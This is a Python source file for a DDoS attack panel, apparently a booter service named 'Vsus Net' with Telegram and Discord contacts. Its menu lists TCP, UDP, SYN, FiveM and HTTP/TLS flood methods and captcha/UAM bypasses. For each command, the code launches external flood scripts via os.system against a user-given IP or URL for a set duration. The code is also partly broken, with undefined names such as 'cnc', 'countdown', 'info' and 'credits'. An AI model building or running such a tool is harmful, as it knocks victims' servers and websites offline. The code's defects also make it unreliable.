import os, sys, requests, json
from pystyle import Colorate, Center, Write, Anime, Colors, System, Col
import time
import subprocess

asciirl = """[PLEASE READ THE FOLLOWING RULES]\n
[1] : Not Following Them Will Result In A Ban On Blacklist !
[2] : Don't share your spot !
[3] : Do not spam the net !
[4] : Don't hit now blacklist websites !\n"""

def banner():
	os.system("cls" if os.name == "nt" else "clear")
	print("""\x1b[38;2;255;255;255m         ,MMM\x1b[38;2;128;128;128m8&&&.
\x1b[38;2;255;255;255m    _...MMMMM\x1b[38;2;128;128;128m88&&&&..._
\x1b[38;2;255;255;255m .::'''MMMMM8\x1b[38;2;128;128;128m8&&&&&&'''::.
\x1b[38;2;255;255;255m::     MMMMM8\x1b[38;2;128;128;128m8&&&&&&     ::
\x1b[38;2;255;255;255m'::....MMMMM8\x1b[38;2;128;128;128m8&&&&&&....::'
 \x1b[38;2;255;255;255m  `''''MMMMM\x1b[38;2;128;128;128m88&&&&''''`
\x1b[38;2;255;255;255m         'MMM\x1b[38;2;128;128;128m8&&&'

\x1b[38;2;255;255;255mHey There \x1b[4m{user}\x1b[0m\x1b[38;2;255;255;255m and welcome to Vsus Net
\x1b[38;2;255;255;255mType  "\x1b[38;2;105;105;105mMethods\x1b[38;2;255;255;255m"  to see the Method.

\x1b[38;2;255;255;255mContact Me Telegram: \x1b[4mhttps://t.me/VsusC2\x1b[0m
\x1b[38;2;255;255;255mJoin To Discord Server: \x1b[4mhttps://discord.gg/a8Ku8yQ4\x1b[0m
""")

def rules():
	os.system("cls" if os.name == "nt" else "clear")
	print(Colorate.Vertical(Colors.white_to_black, (asciirl)))
	
def methods():
	print("""\x1bc\x1b[1m\x1b[38;2;255;0;255m- \x1b[38;2;255;255;255mfivem\x1b[38;2;192;192;192m\x1b[1m:\x1b[38;2;255;255;255m Customized TCP Flood For FiveM\x1b[38;2;255;0;255m.      \x1b[0m\x1b[38;2;192;192;192m| \x1b[48;2;128;128;128m\x1b[38;2;255;255;255m\x1b[1mMaxtime: 900\x1b[0m\x1b[38;2;192;192;192m | \x1b[38;2;255;255;255m\x1b[1mVIP: \x1b[0m\x1b[38;2;124;252;0m█ \x1b[38;2;192;192;192m| \x1b[38;2;255;255;255m\x1b[1mType: \x1b[38;2;255;255;255mL4
\x1b[1m\x1b[38;2;255;0;255m- \x1b[38;2;255;255;255mtcp \x1b[38;2;192;192;192m\x1b[1m: \x1b[38;2;255;255;255mTransmission Control Protocol\x1b[38;2;255;0;255m.        \x1b[0m\x1b[38;2;192;192;192m| \x1b[48;2;128;128;128m\x1b[38;2;255;255;255m\x1b[1mMaxtime: 900\x1b[0m\x1b[38;2;192;192;192m | \x1b[38;2;255;255;255m\x1b[1mVIP: \x1b[0m\x1b[38;2;255;0;0m█ \x1b[38;2;192;192;192m| \x1b[38;2;255;255;255m\x1b[1mType: \x1b[38;2;255;255;255mL4
\x1b[38;2;255;0;255m- \x1b[38;2;255;255;255mudp \x1b[38;2;192;192;192m\x1b[1m: \x1b[38;2;255;255;255mUser Datagram Protocol\x1b[38;2;255;0;255m.               \x1b[0m\x1b[38;2;192;192;192m| \x1b[48;2;128;128;128m\x1b[38;2;255;255;255m\x1b[1mMaxtime: 900\x1b[0m\x1b[38;2;192;192;192m | \x1b[38;2;255;255;255m\x1b[1mVIP: \x1b[0m\x1b[38;2;255;0;0m█ \x1b[38;2;192;192;192m| \x1b[38;2;255;255;255m\x1b[1mType: \x1b[38;2;255;255;255mL4
\x1b[38;2;255;0;255m- \x1b[38;2;255;255;255msyn \x1b[38;2;192;192;192m\x1b[1m:\x1b[38;2;255;255;255m Confusing Target Half Open Con/ctios\x1b[38;2;255;0;255m. \x1b[0m\x1b[38;2;192;192;192m| \x1b[48;2;128;128;128m\x1b[38;2;255;255;255m\x1b[1mMaxtime: 900\x1b[0m\x1b[38;2;192;192;192m | \x1b[38;2;255;255;255m\x1b[1mVIP: \x1b[0m\x1b[38;2;255;0;0m█ \x1b[38;2;192;192;192m| \x1b[38;2;255;255;255m\x1b[1mType: \x1b[38;2;255;255;255mL4
\x1b[38;2;255;0;255m- \x1b[38;2;255;255;255mvse \x1b[38;2;192;192;192m\x1b[1m:\x1b[38;2;255;255;255m I Don't Understand Its Meaning xD\x1b[38;2;255;0;255m.    \x1b[0m\x1b[38;2;192;192;192m| \x1b[48;2;128;128;128m\x1b[38;2;255;255;255m\x1b[1mMaxtime: 900\x1b[0m\x1b[38;2;192;192;192m | \x1b[38;2;255;255;255m\x1b[1mVIP: \x1b[0m\x1b[38;2;255;0;0m█ \x1b[38;2;192;192;192m| \x1b[38;2;255;255;255m\x1b[1mType: \x1b[38;2;255;255;255mL4
\x1b[38;2;255;0;255m- \x1b[38;2;255;255;255mhome\x1b[38;2;192;192;192m\x1b[1m:\x1b[38;2;255;255;255m UDP But With Higher Packet Sizes\x1b[38;2;255;0;255m.     \x1b[0m\x1b[38;2;192;192;192m| \x1b[48;2;128;128;128m\x1b[38;2;255;255;255m\x1b[1mMaxtime: 900\x1b[0m\x1b[38;2;192;192;192m | \x1b[38;2;255;255;255m\x1b[1mVIP: \x1b[0m\x1b[38;2;255;0;0m█ \x1b[38;2;192;192;192m| \x1b[38;2;255;255;255m\x1b[1mType: \x1b[38;2;255;255;255mL4
\x1b[38;2;255;0;255m- \x1b[38;2;255;255;255mhttp\x1b[38;2;192;192;192m\x1b[1m:\x1b[38;2;255;255;255m Only Support HTTP URL\x1b[38;2;255;0;255m.                \x1b[0m\x1b[38;2;192;192;192m| \x1b[48;2;128;128;128m\x1b[38;2;255;255;255m\x1b[1mMaxtime: 900\x1b[0m\x1b[38;2;192;192;192m | \x1b[38;2;255;255;255m\x1b[1mVIP: \x1b[0m\x1b[38;2;255;0;0m█ \x1b[38;2;192;192;192m| \x1b[38;2;255;255;255m\x1b[1mType: \x1b[38;2;255;255;255mL7
\x1b[38;2;255;0;255m- \x1b[38;2;255;255;255mhttps1\x1b[38;2;192;192;192m\x1b[1m:\x1b[38;2;255;255;255m TLS HTTP/1.1 Get Flood (JS)\x1b[38;2;255;0;255m.        \x1b[0m\x1b[38;2;192;192;192m| \x1b[48;2;128;128;128m\x1b[38;2;255;255;255m\x1b[1mMaxtime: 900\x1b[0m\x1b[38;2;192;192;192m | \x1b[38;2;255;255;255m\x1b[1mVIP: \x1b[0m\x1b[38;2;255;0;0m█ \x1b[38;2;192;192;192m| \x1b[38;2;255;255;255m\x1b[1mType: \x1b[38;2;255;255;255mL7
\x1b[38;2;255;0;255m- \x1b[38;2;255;255;255mhttps2\x1b[38;2;192;192;192m\x1b[1m:\x1b[38;2;255;255;255m TLS HTTP/2 Get Flood (JS)\x1b[38;2;255;0;255m.          \x1b[0m\x1b[38;2;192;192;192m| \x1b[48;2;128;128;128m\x1b[38;2;255;255;255m\x1b[1mMaxtime: 900\x1b[0m\x1b[38;2;192;192;192m | \x1b[38;2;255;255;255m\x1b[1mVIP: \x1b[0m\x1b[38;2;255;0;0m█ \x1b[38;2;192;192;192m| \x1b[38;2;255;255;255m\x1b[1mType: \x1b[38;2;255;255;255mL7
\x1b[38;2;255;0;255m- \x1b[38;2;255;255;255mbypass\x1b[38;2;192;192;192m\x1b[1m:\x1b[38;2;255;255;255m HTTP/2 + TLSv1.3 flood\x1b[38;2;255;0;255m.             \x1b[0m\x1b[38;2;192;192;192m| \x1b[48;2;128;128;128m\x1b[38;2;255;255;255m\x1b[1mMaxtime: 900\x1b[0m\x1b[38;2;192;192;192m | \x1b[38;2;255;255;255m\x1b[1mVIP: \x1b[0m\x1b[38;2;255;0;0m█ \x1b[38;2;192;192;192m| \x1b[38;2;255;255;255m\x1b[1mType: \x1b[38;2;255;255;255mL7
\x1b[38;2;255;0;255m- \x1b[38;2;255;255;255mtls\x1b[38;2;192;192;192m\x1b[1m:\x1b[38;2;255;255;255m TLSV1.3, Targeting SSL Handshake\x1b[38;2;255;0;255m.      \x1b[0m\x1b[38;2;192;192;192m| \x1b[48;2;128;128;128m\x1b[38;2;255;255;255m\x1b[1mMaxtime: 900\x1b[0m\x1b[38;2;192;192;192m | \x1b[38;2;255;255;255m\x1b[1mVIP: \x1b[0m\x1b[38;2;124;252;0m█ \x1b[38;2;192;192;192m| \x1b[38;2;255;255;255m\x1b[1mType: \x1b[38;2;255;255;255mL7
\x1b[38;2;255;0;255m- \x1b[38;2;255;255;255mmultibypass\x1b[38;2;192;192;192m\x1b[1m:\x1b[38;2;255;255;255m Bypasses For JS Challenges\x1b[38;2;255;0;255m.    \x1b[0m\x1b[38;2;192;192;192m| \x1b[48;2;128;128;128m\x1b[38;2;255;255;255m\x1b[1mMaxtime: 900\x1b[0m\x1b[38;2;192;192;192m | \x1b[38;2;255;255;255m\x1b[1mVIP: \x1b[0m\x1b[38;2;124;252;0m█ \x1b[38;2;192;192;192m| \x1b[38;2;255;255;255m\x1b[1mType: \x1b[38;2;255;255;255mL7
\x1b[38;2;255;0;255m- \x1b[38;2;255;255;255mbrowser\x1b[38;2;192;192;192m\x1b[1m:\x1b[38;2;255;255;255m Bypasses Captcha/UAM\x1b[38;2;255;0;255m.              \x1b[0m\x1b[38;2;192;192;192m| \x1b[48;2;128;128;128m\x1b[38;2;255;255;255m\x1b[1mMaxtime: 900\x1b[0m\x1b[38;2;192;192;192m | \x1b[38;2;255;255;255m\x1b[1mVIP: \x1b[0m\x1b[38;2;124;252;0m█ \x1b[38;2;192;192;192m| \x1b[38;2;255;255;255m\x1b[1mType: \x1b[38;2;255;255;255mL7
""")
	
def btf():
	print(""" """)
def help():
	print("""\x1bc\x1b[38;2;255;255;255m\x1b[1mrules     -> View the tos
methods   -> View methods page
dnslookup -> Lookup an website
info      -> View your infomation
clear     -> Clear the terminal
credits   -> Tool creadits info
banner    -> Some nice banners
chat      -> Chat with online user in room
exit      -> Exit the terminal""")

def main():
	banner()
	while True:
		vx = input("\x1b[1m\x1b[48;2;128;128;128m\x1b[38;2;255;255;255m{user} • vsus.lol\x1b[0m\x1b[1m\x1b[38;2;255;255;255m > ")
		if vx == "help" or vx == "Help":
			help()
		elif vx == "methods" or vx == "Methods":
			methods()
		elif vx == "rules" or vx == "Rules":
			rules()
		elif vx == "info" or vx == "Info":
			info()
		elif vx == "credits" or vx == "Credits":
			credits()
		elif vx == "clear" or vx == "cls":
			os.system("cls" if os.name == "nt" else "clear")
			banner()
		elif vx == "banner" or vx == "Banner":
			btf()
		elif vx == "exit" or vx == "Exit":
			os.system("pkill python")
			
		elif ".fivem" in vx:
			try:
				ip = vx.split()[1]
				port = vx.split()[2]
				time = vx.split()[3]
				print("\x1b[1m\x1b[38;2;255;255;255m[\x1b[38;2;255;0;0m+\x1b[38;2;255;255;255m] Successfully Broadcasted Your \x1b[4m\x1b[38;2;105;105;105mAttack\x1b[0m\x1b[1m\x1b[38;2;255;255;255m To Our Servers")
				os.system(f"perl FivemDos.pl {ip} {time}")
			except IndexError:
				print("Invalid Usage.")
				print("Usage: .fivem <ip> <port> <duration>")
				
		elif ".tcp" in vx:
			try:
				ip = vx.split()[1]
				port = vx.split()[2]
				time = vx.split()[3]
				print("\x1b[1m\x1b[38;2;255;255;255m[\x1b[38;2;255;0;0m+\x1b[38;2;255;255;255m] Successfully Broadcasted Your \x1b[4m\x1b[38;2;105;105;105mAttack\x1b[0m\x1b[1m\x1b[38;2;255;255;255m To Our Servers")
				os.system(f"python3 tcp {ip} {port} {time} 60000 1")
			except IndexError:
				print("Invalid Usage.")
				print("Usage: .tcp <ip> <port> <duration>")
				
		elif ".udp" in vx:
			try:
				ip = vx.split()[1]
				port = vx.split()[2]
				time = vx.split()[3]
				print("\x1b[1m\x1b[38;2;255;255;255m[\x1b[38;2;255;0;0m+\x1b[38;2;255;255;255m] Successfully Broadcasted Your \x1b[4m\x1b[38;2;105;105;105mAttack\x1b[0m\x1b[1m\x1b[38;2;255;255;255m To Our Servers")
				os.system(f"python3 udp {ip} {port} {time} 65500 1")
			except IndexError:
				print("Invalid Usage.")
				print("Usage: .udp <ip> <port> <duration>")
				
		elif ".syn" in vx:
			try:
				ip = vx.split()[1]
				port = vx.split()[2]
				time = vx.split()[3]
				print("\x1b[1m\x1b[38;2;255;255;255m[\x1b[38;2;255;0;0m+\x1b[38;2;255;255;255m] Successfully Broadcasted Your \x1b[4m\x1b[38;2;105;105;105mAttack\x1b[0m\x1b[1m\x1b[38;2;255;255;255m To Our Servers")
				os.system(f"python3 syn {ip} {port} {time} 2")
			except IndexError:
				print("Invalid Usage.")
				print("Usage: .syn <ip> <port> <duration>")
				
		elif ".vse" in vx:
			print("Comming Soon....")
		elif ".home" in vx:
			try:
				ip = vx.split()[1]
				port = vx.split()[2]
				time = vx.split()[3]
				print("\x1b[1m\x1b[38;2;255;255;255m[\x1b[38;2;255;0;0m+\x1b[38;2;255;255;255m] Successfully Broadcasted Your \x1b[4m\x1b[38;2;105;105;105mAttack\x1b[0m\x1b[1m\x1b[38;2;255;255;255m To Our Servers")
				os.system(f"perl home.pl {ip} {port} 50000 {time}")
			except IndexError:
				print("Invalid Usage.")
				print("Usage: .home <ip> <port> <duration>")

		elif ".http" in vx:
			try:
				url = vx.split()[1]
				port = vx.split()[2]
				time = vx.split()[3]
				print("\x1b[1m\x1b[38;2;255;255;255m[\x1b[38;2;255;0;0m+\x1b[38;2;255;255;255m] Successfully Broadcasted Your \x1b[4m\x1b[38;2;105;105;105mAttack\x1b[0m\x1b[1m\x1b[38;2;255;255;255m To Our Servers")
				os.system(f"perl http-flood.pl {url} 2 {time} 8.8.8.8")
			except IndexError:
				print("Invalid Usage.")
				print("Usage: .http <url> <port> <duration>")

		elif ".https-1" in vx:
			try:
				url = vx.split()[1]
				port = vx.split()[2]
				time = vx.split()[3]
				print("\x1b[1m\x1b[38;2;255;255;255m[\x1b[38;2;255;0;0m+\x1b[38;2;255;255;255m] Successfully Broadcasted Your \x1b[4m\x1b[38;2;105;105;105mAttack\x1b[0m\x1b[1m\x1b[38;2;255;255;255m To Our Servers")
				os.system(f"node https1 GET {url} vp.txt {time} 200 2")
			except IndexError:
				print("Invalid Usage.")
				print("Usage: .https1 <url> <port> <duration>")

		elif ".https-2" in vx:
			try:
				url = vx.split()[1]
				port = vx.split()[2]
				time = vx.split()[3]
				print("\x1b[1m\x1b[38;2;255;255;255m[\x1b[38;2;255;0;0m+\x1b[38;2;255;255;255m] Successfully Broadcasted Your \x1b[4m\x1b[38;2;105;105;105mAttack\x1b[0m\x1b[1m\x1b[38;2;255;255;255m To Our Servers")
				os.system(f"node https2 {url} {time} 3")
			except IndexError:
				print("Invalid Usage.")
				print("Usage: .https2 <url> <port> <duration>")

		elif ".https-load" in vx:
			try:
				url = vx.split()[1]
				port = vx.split()[2]
				time = vx.split()[3]
				print("\x1b[1m\x1b[38;2;255;255;255m[\x1b[38;2;255;0;0m+\x1b[38;2;255;255;255m] Successfully Broadcasted Your \x1b[4m\x1b[38;2;105;105;105mAttack\x1b[0m\x1b[1m\x1b[38;2;255;255;255m To Our Servers")
				os.system(f"node load.js {url} {time} 64 3")
			except IndexError:
				print("Invalid Usage.")
				print("Usage: .bypass <url> <port> <duration>")

		elif ".tls" in vx:
			try:
				url = vx.split()[1]
				port = vx.split()[2]
				time = vx.split()[3]
				print("\x1b[1m\x1b[38;2;255;255;255m[\x1b[38;2;255;0;0m+\x1b[38;2;255;255;255m] Successfully Broadcasted Your \x1b[4m\x1b[38;2;105;105;105mAttack\x1b[0m\x1b[1m\x1b[38;2;255;255;255m To Our Servers")
				subprocess.run([f'node 1.js {url} {time}'], shell=True)
				countdown(int(time))
			except IndexError:
				print("Invalid Usage.")
				print("Usage: .tls <url> <port> <duration>")

		elif ".multibypass" in vx:
			try:
				url = vx.split()[1]
				port = vx.split()[2]
				time = vx.split()[3]
				print("\x1b[1m\x1b[38;2;255;255;255m[\x1b[38;2;255;0;0m+\x1b[38;2;255;255;255m] Successfully Broadcasted Your \x1b[4m\x1b[38;2;105;105;105mAttack\x1b[0m\x1b[1m\x1b[38;2;255;255;255m To Our Servers")
				os.system(f"node method.js {url} {time} request 2")
			except IndexError:
				print("Invalid Usage.")
				print("Usage: .multibypass <url> <port> <duration>")

		elif ".browser" in vx:
			try:
				url = vx.split()[1]
				port = vx.split()[2]
				time = vx.split()[3]
				print("\x1b[1m\x1b[38;2;255;255;255m[\x1b[38;2;255;0;0m+\x1b[38;2;255;255;255m] Successfully Broadcasted Your \x1b[4m\x1b[38;2;105;105;105mAttack\x1b[0m\x1b[1m\x1b[38;2;255;255;255m To Our Servers")
				os.system(f"node uambypass.js {url} {time} 200 vp.txt")
			except IndexError:
				print("Invalid Usage.")
				print("Usage: .browser <url> <port> <duration>")

		elif "dnslookup" in vx:
			try:
				ip = cnc.split()[1]
				r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
				print(r.text)
			except IndexError:
				print("\x1b[1m\x1b[38;2;255;255;255mdnslookup <website>")
		else:
			try:
				cmd = vx.split()[0]
				print("Command [ "+ cmd +" ] Not Found")
			except:
				pass
				
				


main()